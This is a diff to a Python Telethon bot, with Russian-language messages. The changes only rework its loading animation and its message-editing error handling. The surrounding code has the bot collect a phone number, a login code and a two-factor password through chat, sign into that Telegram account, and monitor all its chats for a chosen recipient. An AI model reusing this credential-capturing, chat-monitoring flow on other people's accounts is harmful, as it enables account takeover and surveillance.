@@ -3,7 +3,7 @@ import asyncio
 import logging
 from datetime import datetime
 from telethon import TelegramClient, events
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, MessageNotModifiedError
 import nest_asyncio
 
 nest_asyncio.apply()
@@ -27,18 +27,33 @@ waiting_for_code = None
 waiting_for_password = False
 temp_password_phone = None
 message_cache = {}
-animation_task = None
+current_animation_msg = None  # Текущее сообщение с анимацией
 
 # ========== ФУНКЦИЯ АНИМАЦИИ ==========
 async def show_loading_animation(event, text="⏳ Обработка"):
     """Показывает анимацию со звёздочкой"""
-    frames = ["⭐", "🌟", "✨", "💫", "⭐", "🌟", "✨", "💫"]
-    msg = await event.reply(f"{frames[0]} {text}...")
+    global current_animation_msg
     
-    for i in range(20):  # 20 секунд анимации
-        for frame in frames:
-            await msg.edit(f"{frame} {text}...")
-            await asyncio.sleep(0.3)
+    frames = ["⭐", "🌟", "✨", "💫"]
+    msg = await event.reply(f"{frames[0]} {text}...")
+    current_animation_msg = msg
+    
+    try:
+        for i in range(10):  # 10 секунд анимации
+            for frame in frames:
+                new_text = f"{frame} {text}..."
+                
+                # Проверяем, изменился ли текст
+                if msg.text != new_text:
+                    await msg.edit(new_text)
+                await asyncio.sleep(0.3)
+                
+    except MessageNotModifiedError:
+        # Игнорируем ошибку, если текст не изменился
+        pass
+    except Exception as e:
+        logger.error(f"Ошибка анимации: {e}")
+    
     return msg
 
 # ========== ОБРАБОТЧИКИ ==========
@@ -46,7 +61,7 @@ async def show_loading_animation(event, text="⏳ Обработка"):
 @bot.on(events.NewMessage)
 async def handler(event):
     global waiting_for_target, target_id, waiting_for_phone, waiting_for_code, user_client
-    global waiting_for_password, temp_password_phone, animation_task
+    global waiting_for_password, temp_password_phone, current_animation_msg
     
     user_id = event.sender_id
     text = event.message.text
@@ -65,13 +80,20 @@ async def handler(event):
             if hasattr(target, 'username') and target.username:
                 target_name += f" (@{target.username})"
             
-            await anim.edit(
+            new_text = (
                 f"✅ **ID получателя сохранён!**\n\n"
                 f"📬 Все уведомления будут отправляться:\n"
                 f"👤 {target_name} (ID: {target_id})\n\n"
                 f"📞 **Теперь отправь мне свой номер телефона** в формате:\n"
                 f"`+79001234567`"
             )
+            
+            # Проверяем, изменился ли текст
+            if anim.text != new_text:
+                await anim.edit(new_text)
+            else:
+                await event.reply(new_text)
+                
             waiting_for_phone = True
             
         except Exception as e:
@@ -94,14 +116,24 @@ async def handler(event):
             
             if not await user_client.is_user_authorized():
                 await user_client.send_code_request(phone)
-                
-            await anim.edit(
+            
+            new_text = (
                 f"✅ **Код отправлен!**\n\n"
                 f"📨 Код подтверждения отправлен в Telegram.\n"
                 f"✍️ Введи его сюда (только цифры):"
             )
+            
+            if anim.text != new_text:
+                await anim.edit(new_text)
+            else:
+                await event.reply(new_text)
+                
         except Exception as e:
-            await anim.edit(f"❌ Ошибка: {e}\nПопробуй ещё раз /start")
+            error_text = f"❌ Ошибка: {e}\nПопробуй ещё раз /start"
+            if anim.text != error_text:
+                await anim.edit(error_text)
+            else:
+                await event.reply(error_text)
             waiting_for_code = None
         return
 
@@ -116,19 +148,28 @@ async def handler(event):
             await user_client.sign_in(password=password)
             
             me = await user_client.get_me()
-            await anim.edit(
+            new_text = (
                 f"✅ **Успешный вход с 2FA!**\n\n"
                 f"👤 Аккаунт: @{me.username}\n"
                 f"📱 Номер: {phone}\n\n"
                 f"🔍 Теперь бот будет отслеживать все чаты."
             )
             
+            if anim.text != new_text:
+                await anim.edit(new_text)
+            else:
+                await event.reply(new_text)
+            
             waiting_for_password = False
             temp_password_phone = None
             asyncio.create_task(monitor_user_chats())
             
         except Exception as e:
-            await anim.edit(f"❌ Ошибка: {e}\nПопробуй ещё раз:")
+            error_text = f"❌ Ошибка: {e}\nПопробуй ещё раз:"
+            if anim.text != error_text:
+                await anim.edit(error_text)
+            else:
+                await event.reply(error_text)
         return
 
     # === 4. ЕСЛИ ЖДЁМ КОД ===
@@ -147,12 +188,17 @@ async def handler(event):
                 await user_client.sign_in(phone, code)
             
             me = await user_client.get_me()
-            await anim.edit(
+            new_text = (
                 f"✅ **Успешный вход!**\n\n"
                 f"👤 Аккаунт: @{me.username}\n"
                 f"📱 Номер: {phone}\n\n"
                 f"🔍 Теперь бот будет отслеживать все чаты."
             )
+            
+            if anim.text != new_text:
+                await anim.edit(new_text)
+            else:
+                await event.reply(new_text)
             
             waiting_for_code = None
             asyncio.create_task(monitor_user_chats())
@@ -161,12 +207,21 @@ async def handler(event):
             waiting_for_password = True
             temp_password_phone = phone
             waiting_for_code = None
-            await anim.edit(
+            new_text = (
                 "🔐 **Требуется двухфакторный пароль.**\n\n"
                 "Введи свой пароль от Telegram:"
             )
+            if anim.text != new_text:
+                await anim.edit(new_text)
+            else:
+                await event.reply(new_text)
+                
         except Exception as e:
-            await anim.edit(f"❌ Ошибка входа: {e}")
+            error_text = f"❌ Ошибка входа: {e}"
+            if anim.text != error_text:
+                await anim.edit(error_text)
+            else:
+                await event.reply(error_text)
             waiting_for_code = None
         return
 
